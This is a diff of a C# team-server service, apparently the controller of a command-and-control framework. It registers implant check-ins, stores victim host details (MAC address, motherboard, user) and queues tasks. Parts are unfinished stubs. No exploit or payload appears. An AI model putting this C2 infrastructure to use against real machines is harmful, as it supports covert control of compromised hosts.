@@ -16,9 +16,11 @@ using Trinity.Shared.DTOs.Task;
 using Trinity.Shared.Enums;
 using Trinity.Shared.Models;
 using Trinity.Shared.Results;
+using Trinity.Shared.Enums.Tasks;
 using static Microsoft.EntityFrameworkCore.DbLoggerCategory.Database;
 using static Trinity.Shared.Constants.CheckinRequestOffsets;
 using static Trinity.Shared.Constants.SectionLayout;
+
 
 
 namespace TeamServer.Services
@@ -57,51 +59,15 @@ namespace TeamServer.Services
             // Get the UUID
             var blobSpan = new ReadOnlyMemory<byte>(decodedBytes);
 
-            var uuid = System.Text.Encoding.UTF8.GetString(blobSpan.Slice(RequestStartIndex, UUIDOffset).Span);
-            var request = blobSpan.Slice(36, blobSpan.Length - 36);
+            var uuid = Encoding.UTF8.GetString(blobSpan.Slice(RequestStartIndex, UUIDOffset).Span);
+            var request = blobSpan.Slice(36, blobSpan.Length - UUIDOffset);
 
             var agent = await _agentRepo.GetAgentByCheckInUUID(uuid);
             if (agent == null)
             {
-                var output = JsonSerializer.Deserialize<IntialCheckInRequest>(request.Span);
-                var payload = await _payloadRepo.GetPayloadByUUIDAsync(uuid);
-
-                var agentModel = _agentFactory.Create(output, payload.AES256KEY, 5000, 10, Util.GetEnumValue<Architectures>(payload.Architecture), payload.ID);
-                await _agentRepo.CreateAgentAsync(agentModel);
-                await _agentRepo.CommitAsync();
-
-                var host = new Trinity.Shared.Models.Host 
-                { 
-                    AgentID = agentModel.ID, 
-                    CPUCount = output.CPUCount, 
-                    DiskSize = output.DiskSize, 
-                    FreeDisk = output.FreeDisk,
-                    OS = output.OS,
-                    HostName = output.user,
-                    MACAddress = output.macAddress,
-                    Motherboard = output.motherboard,
-                    RAM = output.RAM
-                };
-                await _hostRepo.AddHostAsync(host);
-                await _hostRepo.CommitAsync();
-
-                return CreateBase64Blob(agentModel.CheckInUUID);
+                return await ProcessIntialCheckin(uuid, request);
             }
 
-            if (blobSpan.Length.Equals(36))
-            {
-                goto Get_Task;
-            }
-
-            var resultRequest = JsonSerializer.Deserialize<ResultRequest>(request.Span);
-            var result = _taskResultFactory.Create(resultRequest);
-
-            await _hubContext.Clients.All.SendAsync("ReceiveTaskOutput", resultRequest.output);
-            await _taskResultRepo.AddTaskResultAsync(result);
-
-            var taskU = await _taskRepo.GetByIdAsync(result.TaskID);
-            taskU.StatusID = StatusCacheService.GetStatusID(resultRequest.status);
-            await _taskRepo.CommitAsync();
 
         Get_Task:
             var task = await _taskRepo.GetTaskFromQueueAsync(agent.ID);
@@ -122,10 +88,6 @@ namespace TeamServer.Services
         private string CreateResponseBlob(string uuid, CheckinResponse response)
         {
             var bufferWriter = new ArrayBufferWriter<byte>();
-            //Span<byte> uuidSpan = bufferWriter.GetSpan(uuid.Length);
-            //int bytesWritten = System.Text.Encoding.UTF8.GetBytes(uuid, uuidSpan);
-            //bufferWriter.Advance(bytesWritten);
-
             using (var jsonWriter = new Utf8JsonWriter(bufferWriter))
             {
                 JsonSerializer.Serialize(jsonWriter, response);
@@ -134,66 +96,87 @@ namespace TeamServer.Services
             return System.Convert.ToBase64String(bufferWriter.WrittenSpan);
         }
 
-
-
-        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-        /// <summary>
-        /// Parses an initial check-in binary blob and constructs an IntialCheckInRequest from the extracted fields.
-        /// </summary>
-        /// <remarks>Parses fields into a list of strings and converts specific items to int or double as
-        /// required. Expects at least 13 fields in the sequence (items[0]..items[12]) and the exact field ordering used
-        /// by the IntialCheckInRequest constructor. May throw ArgumentNullException for null input,
-        /// FormatException/OverflowException on numeric parsing, or ArgumentException/IndexOutOfRangeException if the
-        /// blob is malformed or shorter than expected.</remarks>
-        /// <param name="blob">Binary blob containing a 36-byte header followed by a sequence of length-prefixed UTF-8 fields. Each field
-        /// is encoded as a two-byte ASCII decimal length followed by that many UTF-8 bytes.</param>
-        /// <returns>An IntialCheckInRequest populated with the parsed fields in the expected order.</returns>
-        private IntialCheckInRequest ProcessIntialCheckin(ReadOnlyMemory<byte> blob) 
+        private async Task<string> ProcessIntialCheckin(string uuid, ReadOnlyMemory<byte> requestBody)
         {
-            var items = new List<string>();
-            int blobLen = blob.Length, baseIndex = UUIDOffset;
+            var data = JsonSerializer.Deserialize<IntialCheckInRequest>(requestBody.Span);
+            var payload = await _payloadRepo.GetPayloadByUUIDAsync(uuid);
 
+            var agent = _agentFactory.Create(data!, payload!.AES256KEY, 5000, 10, Util.GetEnumValue<Architectures>(payload.Architecture), payload.ID);
+            await _agentRepo.CreateAgentAsync(agent);
+            await _agentRepo.CommitAsync();
 
-            while (baseIndex < blobLen)
+            var host = new Trinity.Shared.Models.Host
             {
-                var size = int.Parse(blob.Slice(baseIndex, SizeOffset).Span);
-                baseIndex = baseIndex + SizeOffset;
-                var payload = System.Text.Encoding.UTF8.GetString(blob.Slice(baseIndex, size).Span);
-                items.Add(payload);
-                baseIndex = baseIndex + size;
+                AgentID = agent.ID,
+                CPUCount = data!.CPUCount,
+                DiskSize = data.DiskSize,
+                FreeDisk = data.FreeDisk,
+                OS = data.OS,
+                HostName = data.user,
+                MACAddress = data.macAddress,
+                Motherboard = data.motherboard,
+                RAM = data.RAM
+            };
+
+            await _hostRepo.AddHostAsync(host);
+            await _hostRepo.CommitAsync();
+
+            return CreateBase64Blob(agent.CheckInUUID); ;
+        }
+
+        private async Task<string> ProcessFullyEstablishedCheckin(Agent agent, ReadOnlyMemory<byte> requestBody)
+        {
+            using JsonDocument doc = JsonDocument.Parse(requestBody);
+            var taskResults = doc.RootElement.EnumerateArray();
+
+            // Has task results 
+            if (taskResults.Count() > 0)
+            {
+                while (taskResults.MoveNext())
+                {
+
+                }
             }
 
-            return new IntialCheckInRequest(items[0], items[1], items[2], items[3], items[4],
-                int.Parse(items[5]), items[6], items[7], items[8], int.Parse(items[9]),
-                double.Parse(items[10]), double.Parse(items[11]), int.Parse(items[12]));
+            // Get tasking 
+
+            return ""; // Return the blob with tasking 
         }
 
-        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-        private List<ResultRequest> ProcessFullyEstablishedCheckin(ReadOnlyMemory<byte> blob)
+        private async System.Threading.Tasks.Task ProcessTaskResponse(JsonElement element)
         {
-            var results = new List<ResultRequest>();
-            var countSlice = blob.Slice(UUIDOffset, CountOffset);
-            var count = int.Parse(countSlice.Span);
-            var resultPayload = blob.Slice(ResultsOffset, blob.Length - ResultsOffset);
+            var status = (Status) element.GetProperty("status").GetUInt32();
+            var taskID = element.GetProperty("taskID").GetInt32();
+            var task = await _taskRepo.GetByIdAsync(taskID) ?? throw new NullReferenceException();
 
-            for (int i = 0; i < count; i++)
+            switch (status)
             {
-                var result = ProcessResult(resultPayload);
-                results.Add(result);
-            }
-
-            return results;
+                case Status.ERROR:
+                    var error = JsonSerializer.Deserialize<TaskResp<Error>>(element);
+                    // Insert error into DB 
+                    // Update the status of the task record
+                    break;
+                case Status.SUCCESS:
+                {
+                    var response = JsonSerializer.Deserialize<TaskResp<string>>(element);
+                    task.StatusID = (int)status;
+                    task.Result = new TaskResult { TaskID = task.ID, Response = response.Data };
+                    await _taskRepo.CommitAsync();
+                    break;
+                }
+                case Status.RUNNING:
+                    task.StatusID = (int)status;
+                    await _taskRepo.CommitAsync();
+                    break;
+                case Status.MORE_TO_FOLLOW:
+                    break;
+                case Status.NO_MORE_TO_FOLLOW:
+                    break;
+                default:
+                    throw new ArgumentException("Invalid status provided in task header!");
+            }   
         }
 
-        private ResultRequest ProcessResult(ReadOnlyMemory<byte> result)
-        {
-            var taskID = int.Parse(result.Slice(ResultStartIndex, ResultIDOffset).Span);
-            var status = int.Parse(result.Slice(ResultStatusStartIndex, ResultStatusOffset).Span);
-            var size = int.Parse(result.Slice(ResultSizeStartIndex, ResultSizeOffset).Span);
-            var payload = System.Text.Encoding.UTF8.GetString(result.Slice(ResultOutputStartIndex, size).Span);
-
-            return new ResultRequest(taskID, "success", payload);
-        }
 
         //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
         // GetAgentInfo
